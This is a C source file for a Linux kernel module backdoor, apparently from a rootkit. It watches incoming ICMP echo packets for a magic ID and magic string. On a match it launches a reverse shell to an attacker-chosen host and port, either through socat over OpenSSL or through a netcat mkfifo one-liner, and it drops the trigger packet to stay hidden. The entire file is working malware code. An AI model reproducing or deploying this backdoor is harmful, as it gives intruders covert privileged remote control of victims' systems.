#include "backdoor.h"

#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/net.h>
#include <linux/tcp.h>

#include "hooks.h"

void invoke_socat_shell(char *argv[]) {
  char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
                  NULL};
  int shell_size = (strlen(argv[0]) + strlen(argv[1]) + 79);
  char *shell_cmd = kmalloc(shell_size * sizeof(char), GFP_KERNEL);
  char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};

  snprintf(shell_cmd, shell_size,
           "socat openssl-connect:%s:%s,verify=0 exec:'bash "
           "-li',pty,stderr,setsid,sigint,sane",
           argv[0], argv[1]);
  call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);

#ifdef DEBUG
  printk(KERN_INFO "sended a shell to %s on port %s\n", argv[0], argv[1]);
#endif
}

void invoke_nc_shell(char *argv[]) {
  char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
                  NULL};
  int shell_size = (strlen(argv[0]) + strlen(argv[1]) + 64);
  char *shell_cmd = kmalloc(shell_size * sizeof(char), GFP_KERNEL);
  char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};

  snprintf(
      shell_cmd, shell_size,
      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f",
      argv[0], argv[1]);
  call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);

#ifdef DEBUG
  printk(KERN_INFO "sended a shell to %s on port %s\n", argv[0], argv[1]);
#endif
}

unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
  const struct iphdr *ip_header;
  const struct icmphdr *icmp_header;
  struct iphdr _iph;
  struct icmphdr _icmph;
  const char *data = NULL;
  char *_data, *argv_str, **argv;
  int size, str_size;

  if (!socket_buffer) return ACCEPT;

  ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

  if (!ip_header) return ACCEPT;

  if (!ip_header->protocol) return ACCEPT;

  if (ip_header->protocol == IPPROTO_ICMP) {
    icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4,
                                     sizeof(_icmph), &_icmph);

    if (!icmp_header) return ACCEPT;

    if (icmp_header->code != ICMP_ECHO) return ACCEPT;

    if (htons(icmp_header->un.echo.id) == MAGIC_NUMBER) {
      size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
      _data = kmalloc(size, GFP_KERNEL);

      if (!_data) return ACCEPT;

      str_size = size - strlen(MAGIC_VALUE);
      argv_str = kmalloc(str_size, GFP_KERNEL);

      data = skb_header_pointer(socket_buffer,
                                ip_header->ihl * 4 + sizeof(struct icmphdr),
                                size, &_data);
      if (!data) {
        kfree(_data);
        kfree(argv_str);
        return ACCEPT;
      }
      if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
        memzero_explicit(argv_str, str_size);
        memcpy(argv_str, data + strlen(MAGIC_VALUE) + 1, str_size - 1);
        argv = argv_split(GFP_KERNEL, argv_str, NULL);

        if (argv) {
          if (strcmp(argv[2], "socat") == 0) {
            invoke_socat_shell(argv);
          } else {
            invoke_nc_shell(argv);
          }
          argv_free(argv);
        }
        kfree(_data);
        kfree(argv_str);

        return DROP;
      }
    }
  }
  return ACCEPT;
}
